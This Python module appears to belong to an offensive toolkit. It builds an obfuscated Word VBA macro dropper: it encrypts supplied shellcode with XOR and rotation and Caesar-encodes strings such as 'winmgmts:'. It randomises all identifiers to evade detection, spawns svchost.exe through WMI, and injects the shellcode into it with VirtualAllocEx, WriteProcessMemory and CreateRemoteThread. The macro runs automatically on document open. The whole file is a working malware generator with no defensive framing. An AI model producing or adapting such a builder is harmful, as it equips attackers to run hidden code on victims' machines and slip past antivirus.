import os
import random
import string
from ..core.utils import console

def xor_rot_encrypt(data, xor_key, rot_shift):
    encrypted = bytearray()
    key_len = len(xor_key)
    for i in range(len(data)):
        # XOR
        val = data[i] ^ xor_key[i % key_len]
        # ROT
        val = (val + rot_shift) % 256
        encrypted.append(val)
    return encrypted

def generate_random_name(length=8):
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))

def format_vba_chunks(var_name, data, chunk_size=50):
    str_data = [str(b) for b in data]
    lines = []
    for i in range(0, len(str_data), chunk_size):
        chunk = ",".join(str_data[i:i + chunk_size])
        if i == 0:
            lines.append(f'{var_name} = "{chunk}"')
        else:
            lines.append(f'{var_name} = {var_name} & ",{chunk}"')
    return "\n    ".join(lines)

VBA_TEMPLATE = """
#If VBA7 Then
    Private Declare PtrSafe Function {api_open} Lib "kernel32" Alias "OpenProcess" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As LongPtr
    Private Declare PtrSafe Function {api_alloc} Lib "kernel32" Alias "VirtualAllocEx" (ByVal hProcess As LongPtr, ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
    Private Declare PtrSafe Function {api_write} Lib "kernel32" Alias "WriteProcessMemory" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, ByRef lpBuffer As Any, ByVal nSize As Long, ByRef lpNumberOfBytesWritten As Long) As Long
    Private Declare PtrSafe Function {api_thread} Lib "kernel32" Alias "CreateRemoteThread" (ByVal hProcess As LongPtr, ByVal lpThreadAttributes As LongPtr, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, ByVal lpParameter As LongPtr, ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As LongPtr
#Else
    Private Declare Function {api_open} Lib "kernel32" Alias "OpenProcess" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
    Private Declare Function {api_alloc} Lib "kernel32" Alias "VirtualAllocEx" (ByVal hProcess As Long, ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
    Private Declare Function {api_write} Lib "kernel32" Alias "WriteProcessMemory" (ByVal hProcess As Long, ByVal lpBaseAddress As Long, ByRef lpBuffer As Any, ByVal nSize As Long, ByRef lpNumberOfBytesWritten As Long) As Long
    Private Declare Function {api_thread} Lib "kernel32" Alias "CreateRemoteThread" (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, ByVal lpParameter As Long, ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As Long
#End If

Function {func_decrypt}({var_data} As String) As Byte()
    Dim {var_key} As Variant
    Dim {var_res}() As Byte
    Dim {var_i} As Long
    Dim {var_val} As Integer
    Dim {var_split} As Variant
    
    {var_key} = Array({xor_key_vba})
    {var_split} = Split({var_data}, ",")
    ReDim {var_res}(UBound({var_split}))
    
    For {var_i} = LBound({var_split}) To UBound({var_split})
        {var_val} = CInt({var_split}({var_i}))
        {var_val} = {var_val} - {rot_shift}
        If {var_val} < 0 Then {var_val} = {var_val} + 256
        {var_res}({var_i}) = CByte({var_val} Xor {var_key}({var_i} Mod (UBound({var_key}) + 1)))
    Next {var_i}
    {func_decrypt} = {var_res}
End Function

Function {func_pears}({var_beets})
    {func_pears} = Chr({var_beets} - 17)
End Function

Function {func_nuts}({var_milk})
    Dim {var_oat} As String: {var_oat} = ""
    Do
        {var_oat} = {var_oat} & {func_pears}(CInt(Left({var_milk}, 3)))
        {var_milk} = Right({var_milk}, Len({var_milk}) - 3)
    Loop While Len({var_milk}) > 0
    {func_nuts} = {var_oat}
End Function

Sub {func_main}()
    Dim {var_raw} As String
    Dim {var_shellcode}() As Byte
    #If VBA7 Then
        Dim {var_hproc} As LongPtr, {var_addr} As LongPtr
    #Else
        Dim {var_hproc} As Long, {var_addr} As Long
    #End If
    Dim {var_pid} As Long, {var_tid} As Long, {var_written} As Long
    Dim {var_wmi} As Object, {var_res} As Long

    ' 1. De-chain via WMI
    Set {var_wmi} = GetObject({func_nuts}("{enc_winmgmts}"))
    {var_res} = {var_wmi}.Get({func_nuts}("{enc_win32_proc}")).Create({func_nuts}("{enc_target}"), Null, Null, {var_pid})
    
    If {var_pid} = 0 Then Exit Sub

    ' 2. Decrypt Shellcode
    {chunked_assignments}
    {var_shellcode} = {func_decrypt}({var_raw})

    ' 3. Inject into de-chained process
    {var_hproc} = {api_open}(&H1F0FFF, 0, {var_pid})
    If {var_hproc} <> 0 Then
        {var_addr} = {api_alloc}({var_hproc}, 0, UBound({var_shellcode}) + 1, &H3000, &H40)
        {api_write} {var_hproc}, {var_addr}, {var_shellcode}(0), UBound({var_shellcode}) + 1, {var_written}
        {api_thread} {var_hproc}, 0, 0, {var_addr}, 0, 0, {var_tid}
    End If
End Sub

Sub Document_Open()
    {func_main}
End Sub

Sub AutoOpen()
    {func_main}
End Sub
"""

def caesar_encrypt(text, shift=17):
    output = ""
    for char in text:
        val = ord(char) + shift
        output += f"{val:03d}"
    return output

def generate(shellcode, output_dir):
    xor_key = [random.randint(1, 255) for _ in range(16)]
    rot_shift = random.randint(1, 100)
    encrypted = xor_rot_encrypt(shellcode, xor_key, rot_shift)
    
    var_raw = generate_random_name()
    names = {
        "api_open": generate_random_name(),
        "api_alloc": generate_random_name(),
        "api_write": generate_random_name(),
        "api_thread": generate_random_name(),
        "func_decrypt": generate_random_name(),
        "func_pears": generate_random_name(),
        "func_nuts": generate_random_name(),
        "func_main": generate_random_name(),
        "var_data": generate_random_name(),
        "var_key": generate_random_name(),
        "var_res": generate_random_name(),
        "var_i": generate_random_name(),
        "var_val": generate_random_name(),
        "var_raw": var_raw,
        "var_shellcode": generate_random_name(),
        "var_split": generate_random_name(),
        "var_beets": generate_random_name(),
        "var_milk": generate_random_name(),
        "var_oat": generate_random_name(),
        "var_pid": generate_random_name(),
        "var_tid": generate_random_name(),
        "var_hproc": generate_random_name(),
        "var_addr": generate_random_name(),
        "var_written": generate_random_name(),
        "var_wmi": generate_random_name(),
        "xor_key_vba": ", ".join(map(str, xor_key)),
        "rot_shift": rot_shift,
        "enc_winmgmts": caesar_encrypt("winmgmts:"),
        "enc_win32_proc": caesar_encrypt("Win32_Process"),
        "enc_target": caesar_encrypt("C:\\Windows\\System32\\svchost.exe")
    }
    
    names["chunked_assignments"] = format_vba_chunks(var_raw, encrypted)
    output = VBA_TEMPLATE.format(**names)
    
    output_file = os.path.join(output_dir, "wmi_stealth_sf.vba")
    with open(output_file, "w") as f:
        f.write(output)
        
    console.print(f"[bold green][+] Success! WMI Single-File VBA saved to: [bold white]{output_file}[/bold white][/bold green]")
    return output_file
